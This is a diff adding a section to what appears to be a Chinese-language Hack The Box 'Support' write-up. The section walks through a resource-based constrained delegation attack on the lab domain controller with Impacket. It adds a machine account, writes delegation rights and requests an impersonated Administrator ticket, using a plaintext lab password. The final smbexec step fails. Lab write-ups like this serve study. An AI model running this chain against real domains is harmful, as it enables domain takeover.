@@ -331,3 +331,47 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 ```
+
+# Why not RBCD
+你或许会问为什么不用 `rbcd`, 在本机上结果如下:
+```sh
+addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name rbcd -computer-pass '#stackcat123!'
+Impacket (Exegol fork) v0.14.0.dev0+20260623.162750.a2296a07 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account rbcd$ with password #stackcat123!.
+
+impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' -delegate-to 'DC$' -delegate-from 'rbcd$' -dc-ip 10.129.19.76 -action write -debug
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /Users/r3vert/.pyenv/versions/3.12.7/lib/python3.12/site-packages/impacket
+[+] Initializing domainDumper()
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] rbcd$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     rbcd$        (S-1-5-21-1677581083-3380853377-188903654-6101)
+
+impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.19.76   'support.htb/rbcd$:#stackcat123!'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+
+export KRB5CCNAME=./Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+
+impacket-smbexec  -no-pass -k support.htb/Administrator@dc.support.htb  -debug
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /Users/r3vert/.pyenv/versions/3.12.7/lib/python3.12/site-packages/impacket
+[+] StringBinding ncacn_np:dc.support.htb[\pipe\svcctl]
+[+] Using Kerberos Cache: ./Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+[+] Returning cached credential for CIFS/DC.SUPPORT.HTB@SUPPORT.HTB
+[+] Using TGS from cache
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
+```
+
+本地机器为 `Darwin r1ngz0ps.local 24.6.0 Darwin Kernel Version 24.6.0: Tue Apr 21 20:18:11 PDT 2026; root:xnu-11417.140.69.710.16~1/RELEASE_ARM64_T6020 arm64`, 如有遇到相关情况的师傅, 可以到 About 页面给出的群中找我, 万分感谢.
